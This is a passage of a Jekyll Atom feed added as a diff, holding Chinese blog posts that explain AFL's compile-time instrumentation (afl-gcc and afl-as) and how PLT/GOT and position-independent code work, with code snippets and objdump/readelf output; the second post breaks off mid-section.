@@ -1,0 +1,584 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-12-15T09:58:08+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Triangleowl’s Blog</title><subtitle>Hello World!
+</subtitle><author><name>triangleowl</name></author><entry><title type="html">AFL 源码码插桩分析</title><link href="http://localhost:4000/fuzzing/AFL-instrunmentation" rel="alternate" type="text/html" title="AFL 源码码插桩分析" /><published>2019-11-23T00:00:00+08:00</published><updated>2019-11-23T00:00:00+08:00</updated><id>http://localhost:4000/fuzzing/AFL-instrunmentation</id><content type="html" xml:base="http://localhost:4000/fuzzing/AFL-instrunmentation">&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+&lt;h4 id=&quot;afl-gcc分析-&quot;&gt;&lt;a href=&quot;#afl-gcc分析&quot;&gt;afl-gcc分析 &lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;afl-as分析-&quot;&gt;&lt;a href=&quot;#afl-as分析&quot;&gt;afl-as分析 &lt;/a&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;查找代码部分-&quot;&gt;&lt;a href=&quot;#查找代码部分&quot;&gt;查找代码部分 &lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;查找-basic-block-&quot;&gt;&lt;a href=&quot;#查找-basic-block&quot;&gt;查找 basic block &lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;忽略插桩部分-&quot;&gt;&lt;a href=&quot;#忽略插桩部分&quot;&gt;忽略插桩部分 &lt;/a&gt;&lt;/h4&gt;
+    &lt;hr /&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;afl-gcc分析&quot;&gt;&lt;a href=&quot;#afl-gcc分析&quot;&gt;afl-gcc分析&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 既可以对源代码进行插桩也可以结合 &lt;code class=&quot;highlighter-rouge&quot;&gt;QEMU&lt;/code&gt; 对二进制进行插桩，本问主要针对 &lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 的源码插桩进行分析。&lt;/p&gt;
+
+&lt;p&gt;我们都知道&lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt;程序从源代码到可执行文件要经过四个步骤：&lt;code class=&quot;highlighter-rouge&quot;&gt;预处理&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;编译&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;汇编&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;链接&lt;/code&gt;。每个步骤的工作可以概括如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;预处理阶段&lt;/strong&gt;. 预处理器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;)根据以 &lt;em&gt;&lt;strong&gt;#&lt;/strong&gt;&lt;/em&gt; 开头的代码来修改原始的C程序。比如 &lt;em&gt;hello world&lt;/em&gt; 程序将 &lt;em&gt;#include&lt;/em&gt; 命令告诉预处理器读取 &lt;em&gt;stdio.h&lt;/em&gt; 的内容，并插入到 &lt;em&gt;hello world&lt;/em&gt; 程序中生成 &lt;em&gt;hello.i&lt;/em&gt; 文件。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;编译阶段&lt;/strong&gt;. 编译器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1&lt;/code&gt;)将 &lt;em&gt;hello.i&lt;/em&gt; 文件翻译成汇编文件 &lt;em&gt;hello.s&lt;/em&gt;。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;汇编阶段&lt;/strong&gt;. 汇编器(&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;)将 &lt;em&gt;hello.s&lt;/em&gt; 文件中的汇编指令翻译成机器语言指令，并把这些指令打包成_可重定位目标文件_，并按照&lt;code class=&quot;highlighter-rouge&quot;&gt;ELF&lt;/code&gt;文件格式生成 &lt;em&gt;hello.o&lt;/em&gt; 文件。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;链接阶段&lt;/strong&gt;. &lt;em&gt;hello world&lt;/em&gt; 程序调用了 &lt;em&gt;printf&lt;/em&gt; 函数，但是我们的源文件里并没有这个函数的代码，它是一个C语言标准库里的代码。链接阶段就由连接器(&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;)来确定 &lt;em&gt;printf&lt;/em&gt; 函数的地址，从而确保程序在执行时能正确调用 &lt;em&gt;printf&lt;/em&gt; 函数。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;其实也是上面几个工具的一个wrapper，首先&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;对代码进行预处理，然后将预处理后的文件交给&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1&lt;/code&gt;执行编译生成汇编文件，汇编器&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;将汇编文件作为输入生成机器码–目标文件，最后由连接器&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;将目标文件链接生成可执行文件。&lt;/p&gt;
+
+&lt;p&gt;AFL 实际上是在在编译过程完成后汇编过程之前对汇编文件进行插桩的，AFL 使用&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;对C/C++程序源码进行插桩(afl-g++是afl-gcc的一个链接)。而&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;又是&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;的wrapper,&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;设置&lt;code class=&quot;highlighter-rouge&quot;&gt;-B direcotry&lt;/code&gt;后再调用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;函数如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
+afl-gcc.c:main()
+*/
+
+find_as(argv[0]); //查找argv[0]的目录(即afl-gcc的目录)供 edit_params()函数使用
+
+edit_params(argc, argv); //设置 -B 选项和参数
+
+execvp(cc_params[0], (char**)cc_params); //调用 gcc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;而&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;又是&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;的wrapper,&lt;code class=&quot;highlighter-rouge&quot;&gt;-B directory&lt;/code&gt;的作用是让&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;首先在 &lt;em&gt;directory&lt;/em&gt; 查找&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;将 &lt;em&gt;direcotry&lt;/em&gt; 设置为afl-gcc所在的目录，当进行预处理和编译时到 &lt;em&gt;direcotry&lt;/em&gt; 找不到&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;就会使用默认的&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;。而当&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;编译完成后在 &lt;em&gt;direcotry&lt;/em&gt; 查找汇编器 &lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;，刚好 &lt;em&gt;dircotry&lt;/em&gt; 有&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;(这个&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;其实是&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;的链接)。接下来就是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;对汇编代码插桩。&lt;/p&gt;
+
+&lt;h3 id=&quot;afl-as分析&quot;&gt;&lt;a href=&quot;#afl-as分析&quot;&gt;afl-as分析&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;是&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;的wrapper，&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;会在汇编代码的代码相应位置插入统计代码，然后调用真正的&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;进行汇编。统计代码是在&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.h&lt;/code&gt;文件中，&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;负责找到每个 &lt;em&gt;basic block&lt;/em&gt; 插入 &lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.h&lt;/code&gt;中的统计代码。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.c:main()&lt;/code&gt;主要调用了两个函数：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
+afl-as.c:main()
+*/
+
+edit_params(argc, argv); //调整传递给真正的汇编器`as`的参数。
+
+add_instrumentation(); //判断分支，插入统计代码
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;查找代码部分&quot;&gt;&lt;a href=&quot;#查找代码部分&quot;&gt;查找代码部分&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.c&lt;/code&gt;中最重要的就是 &lt;em&gt;add_instrumentation()&lt;/em&gt; 函数，它只对代码部分进行插桩。具体的代码如下,如果是代码部分则会将 &lt;code class=&quot;highlighter-rouge&quot;&gt;instr_ok&lt;/code&gt; 置1。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (line[0] == '\t' &amp;amp;&amp;amp; line[1] == '.') {
+
+  /* OpenBSD puts jump tables directly inline with the code, which is
+     a bit annoying. They use a specific format of p2align directives
+     around them, so we use that as a signal. */
+
+  if (!clang_mode &amp;amp;&amp;amp; instr_ok &amp;amp;&amp;amp; !strncmp(line + 2, &quot;p2align &quot;, 8) &amp;amp;&amp;amp;
+      isdigit(line[10]) &amp;amp;&amp;amp; line[11] == '\n') skip_next_label = 1;
+
+  if (!strncmp(line + 2, &quot;text\n&quot;, 5) ||
+      !strncmp(line + 2, &quot;section\t.text&quot;, 13) ||
+      !strncmp(line + 2, &quot;section\t__TEXT,__text&quot;, 21) ||
+      !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) {
+    instr_ok = 1;
+    continue;
+  }
+
+  if (!strncmp(line + 2, &quot;section\t&quot;, 8) ||
+      !strncmp(line + 2, &quot;section &quot;, 8) ||
+      !strncmp(line + 2, &quot;bss\n&quot;, 4) ||
+      !strncmp(line + 2, &quot;data\n&quot;, 5)) {
+    instr_ok = 0;
+    continue;
+  }
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;查找-basic-block&quot;&gt;&lt;a href=&quot;#查找-basic-block&quot;&gt;查找 basic block&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;通过两种方法来查找 &lt;em&gt;basic block&lt;/em&gt;, 一种是通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt;， 另一种是通过条件跳转指令来识别 &lt;em&gt;basic block&lt;/em&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt; 通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt; 查找 &lt;em&gt;basic block&lt;/em&gt; 的方法很简单，具体是以 “点号”(&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;)开始,以“冒号”(&lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt;)结束，中间是字母数字组合。如果找到这种 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt; 就将 &lt;code class=&quot;highlighter-rouge&quot;&gt;instrument_next&lt;/code&gt; 置1。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (strstr(line, &quot;:&quot;)) {
+      if (line[0] == '.') {
+          ...
+          instrument_next = 1;
+      }
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;另外还有一种情况就是产生条件分支的地方，一般是进行比较根据比较结果来决定是否跳转(如 jnz xxx)，但是条件跳转指令的下一条也是一个 &lt;em&gt;basic block&lt;/em&gt; 的开始处，但是没有 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt;, 所以要通过判断指令本身来决定是否是条件跳转指令，如果是则在在条件跳转指令后插入统计代码。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Conditional branch instruction (jnz, etc). We append the instrumentation
+   right after the branch (to instrument the not-taken path) and at the
+   branch destination label (handled later on). */
+
+if (line[0] == '\t') {
+
+  if (line[1] == 'j' &amp;amp;&amp;amp; line[2] != 'm' &amp;amp;&amp;amp; R(100) &amp;lt; inst_ratio) {
+
+    fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,
+            R(MAP_SIZE));
+
+    ins_lines++;
+
+  }
+
+  continue;
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;忽略插桩部分&quot;&gt;&lt;a href=&quot;#忽略插桩部分&quot;&gt;忽略插桩部分&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt; 并不是对所有的 &lt;em&gt;basic block&lt;/em&gt; 都进行插桩，它会忽略以下集中情况: Intel汇编、源代码内嵌汇编代码。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;生成的是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AT&amp;amp;T&lt;/code&gt; 汇编，如果发现 &lt;em&gt;.intel_syntax&lt;/em&gt; 则跳过，不对Intel汇编插桩。使用源代码内嵌汇编编程时，生成的汇编代码会在内嵌汇编处用 &lt;em&gt;#APP&lt;/em&gt; 和 &lt;em&gt;#NO_APP&lt;/em&gt; 来标记。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Detect syntax changes, as could happen with hand-written assembly.
+   Skip Intel blocks, resume instrumentation when back to AT&amp;amp;T. */
+
+if (strstr(line, &quot;.intel_syntax&quot;)) skip_intel = 1;
+if (strstr(line, &quot;.att_syntax&quot;)) skip_intel = 0;
+
+/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */
+
+if (line[0] == '#' || line[1] == '#') {
+
+  if (strstr(line, &quot;#APP&quot;)) skip_app = 1;
+  if (strstr(line, &quot;#NO_APP&quot;)) skip_app = 0;
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 的插桩过程，具体的插桩指令 &lt;a href=&quot;https://rk700.github.io/2017/12/28/afl-internals/&quot;&gt;AFL内部实现细节小记&lt;/a&gt; 写的非常好。&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">Table of Contents afl-gcc分析 afl-as分析 查找代码部分 查找 basic block 忽略插桩部分</summary></entry><entry><title type="html">PLT和GOT–实现位置无关代码</title><link href="http://localhost:4000/linux/Position-Independent-Code" rel="alternate" type="text/html" title="PLT和GOT--实现位置无关代码" /><published>2019-11-06T00:00:00+08:00</published><updated>2019-11-06T00:00:00+08:00</updated><id>http://localhost:4000/linux/Position-Independent-Code</id><content type="html" xml:base="http://localhost:4000/linux/Position-Independent-Code">&lt;h4 id=&quot;table-of-contents&quot;&gt;Table Of Contents&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;链接时重定位-&quot;&gt;&lt;a href=&quot;#链接时重定位&quot;&gt;链接时重定位 &lt;/a&gt;&lt;/h4&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h4 id=&quot;装载时重定位-&quot;&gt;&lt;a href=&quot;#装载时重定位&quot;&gt;装载时重定位 &lt;/a&gt;&lt;/h4&gt;
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;h5 id=&quot;模块内部数据访问-&quot;&gt;&lt;a href=&quot;#模块内部数据访问&quot;&gt;模块内部数据访问 &lt;/a&gt;&lt;/h5&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;h5 id=&quot;模块间数据访问-&quot;&gt;&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问 &lt;/a&gt;&lt;/h5&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;h5 id=&quot;模块间函数调用-&quot;&gt;&lt;a href=&quot;#模块间函数调用&quot;&gt;模块间函数调用 &lt;/a&gt;&lt;/h5&gt;
+        &lt;hr /&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;链接时重定位&quot;&gt;&lt;a href=&quot;#链接时重定位&quot;&gt;链接时重定位&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;程序是如何定位来自外部的符号（如引用外部的变量和函数）？ 一个简单的例子如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test.c
+extern int foo;
+
+int function(void)
+{
+	return foo;
+}
+
+#编译程序，生成目标文件test.o
+$ gcc -c test.c
+
+#将目标文件反汇编
+$ objdump -d test.o
+...
+00000000 &amp;lt;function&amp;gt;:
+   0:	55                   	push   %ebp
+   1:	89 e5                	mov    %esp,%ebp
+   3:	a1 00 00 00 00       	mov    0x0,%eax
+   8:	5d                   	pop    %ebp
+   9:	c3                   	ret
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到本来应该将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值赋给&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;，但是汇编代码显示将0x0赋给了&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;。这是因为test.o无法定
+位来自外部的&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;，这等到链接过程由链接器来确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;，如果使用链接器将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;与另一个目标文件的
+&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;绑定则在生成可执行文件时就可以确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址。也就是说上面的例子对&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的重定位是在链接时
+完成的，叫做&lt;code class=&quot;highlighter-rouge&quot;&gt;链接时重定位(Link Time Relocation)&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;链接时重定位的代码需要指定加载地址，当加载器加载代码时只要按照指定的加载地址即可。这种代码并不是
+位置无关代码(PIC)。如查看&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;的program headers:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --headers /bin/bash
+...
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  ...
+  LOAD           0x000000 0x08048000 0x08048000 0x1098d8 0x1098d8 R E 0x1000
+  LOAD           0x109ef8 0x08152ef8 0x08152ef8 0x049b0 0x09974 RW  0x1000
+  ...
+...
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;可以看到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;并不是位置无关代码，因为它的代码(&lt;code class=&quot;highlighter-rouge&quot;&gt;R&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;E&lt;/code&gt;)将被加载到地址0x08048000处，数据(&lt;code class=&quot;highlighter-rouge&quot;&gt;R&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;W&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;)将被加载
+到地址0x08152ef8处。&lt;/p&gt;
+
+&lt;p&gt;共享库就不能被指定加载地址，而是应该可以被加载到进程运行的任意地址，这就要采用位置无关代码技术。
+如&lt;code class=&quot;highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt;共享库的program heasers中就没有指定加载地址。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --headers /lib/ld-linux.so.2
+...
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  LOAD           0x000000 0x00000000 0x00000000 0x2220c 0x2220c R E 0x1000
+  LOAD           0x022c80 0x00023c80 0x00023c80 0x00bd8 0x00c98 RW  0x1000
+  ...
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;装载时重定位&quot;&gt;&lt;a href=&quot;#装载时重定位&quot;&gt;装载时重定位&lt;/a&gt;&lt;/h3&gt;
+
+&lt;h4 id=&quot;模块内部数据访问&quot;&gt;&lt;a href=&quot;#模块内部数据访问&quot;&gt;模块内部数据访问&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;接下来我们自己编译一个位置无关代码(使用gcc编译时添加 -fPIC 和 -shared选项)，然后将目标代码反
+汇编，看看是怎么定位符号的。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test2.c
+static int foo = 100;//静态变量
+
+int function(void)
+{
+	return foo;
+}
+
+#加上-fPIC -shared 选项，生成位置无关代码
+$ gcc -fPIC -shared -o libtest2.so test2.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;objumpd&lt;/code&gt;反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest2.so&lt;/code&gt;可以看到function()对应的汇编代码，调用了__x86.get_pc_thunk.ax,
+__x86.get_pc_thunk.ax的代码很简单，只是将&lt;code class=&quot;highlighter-rouge&quot;&gt;(%esp)&lt;/code&gt;的值传给&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;。有人可能会有疑问，这么简单
+为什么还要封装成函数？因为处理器不支持直接获取当前程序的位置也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;PC&lt;/code&gt;，所以通过调用
+__x86.get_pc_thunk.ax函数就是为了达到获取当前的&lt;code class=&quot;highlighter-rouge&quot;&gt;PC&lt;/code&gt;。在调用__x86.get_pc_thunk.ax会先把&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;
+的下一条指令的地址压如stack，当程序流程转向__x86.get_pc_thunk.ax时&lt;code class=&quot;highlighter-rouge&quot;&gt;%esp&lt;/code&gt;正好指向&lt;code class=&quot;highlighter-rouge&quot;&gt;add    $0x1b28,%eax&lt;/code&gt;
+指令的地址。就可以将PC存入&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;了。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest2.so
+...
+000004d0 &amp;lt;function&amp;gt;:
+ 4d0:	55                   	push   %ebp
+ 4d1:	89 e5                	mov    %esp,%ebp
+ 4d3:	e8 0d 00 00 00       	call   4e5 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 4d8:	05 28 1b 00 00       	add    $0x1b28,%eax
+ 4dd:	8b 80 10 00 00 00    	mov    0x10(%eax),%eax
+ 4e3:	5d                   	pop    %ebp
+ 4e4:	c3                   	ret
+...
+
+000004e5 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;:
+ 4e5:	8b 04 24             	mov    (%esp),%eax
+ 4e8:	c3                   	ret
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;执行完__x86.get_pc_thunk.ax返回function()后将&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;的值就被赋值为0x4d8, 然后将&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;加上0x1b28即：
+0x4d8 + 0x1b28 = 0x2000。&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt; + 0x10 = 0x2010。这里存放的应该就是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值了。反汇编一下看看是不是。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump --disassemble-all libtest2.so
+...
+00002010 &amp;lt;foo&amp;gt;:
+    2010:	64 00 00             	add    %al,%fs:(%eax)
+	...
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;果然在0x2010处存放的是十六进制的0x64,即十进制的100。&lt;/p&gt;
+
+&lt;h4 id=&quot;模块间数据访问&quot;&gt;&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;回想一下上面的程序，虽然是位置无关代码，但是变量&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;是一个&lt;code class=&quot;highlighter-rouge&quot;&gt;static&lt;/code&gt;变量，所以要访问&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;只要知道&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;和当前
+指令的偏移量就够了。但是如果引用了来自其他共享库中的变量会怎么样呢？因为共享库的加载地址是不确定的，那如何
+做到引用外部变量而不出错呢？来看看下面的程序是如何实现重定位的。&lt;/p&gt;
+
+&lt;p&gt;稍微调整一下上面的代码，并添加 &lt;code class=&quot;highlighter-rouge&quot;&gt;-fPIC&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;-shared&lt;/code&gt;选项编译：&lt;/p&gt;
+
